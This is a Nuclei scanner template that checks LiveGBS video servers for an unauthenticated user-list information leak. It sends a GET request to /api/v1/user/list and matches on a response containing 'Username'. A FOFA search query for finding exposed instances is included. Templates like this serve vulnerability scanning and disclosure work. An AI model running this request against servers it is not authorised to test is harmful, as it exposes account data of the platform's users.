id: LiveGBS-save-list

info:
  name: LiveGBS-信息泄漏-list
  author: rain
  severity: high
  metadata: 
    fofa-query: icon_hash="-206100324"

  tags: Information Disclosure

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        GET /api/v1/user/list?q=&start=0&limit=100&enable=&sort=CreatedAt&order=desc HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Encoding: gzip, deflate
        sec-ch-ua: "Google Chrome";v="117", "Chromium";v="117", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0
        Accept-Language: zh-CN,zh;q=0.9
        sec-ch-ua-platform: "Windows"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest


    matchers:
      - type: dsl
        dsl:
          - "status_code == 200  && contains(body,'Username') "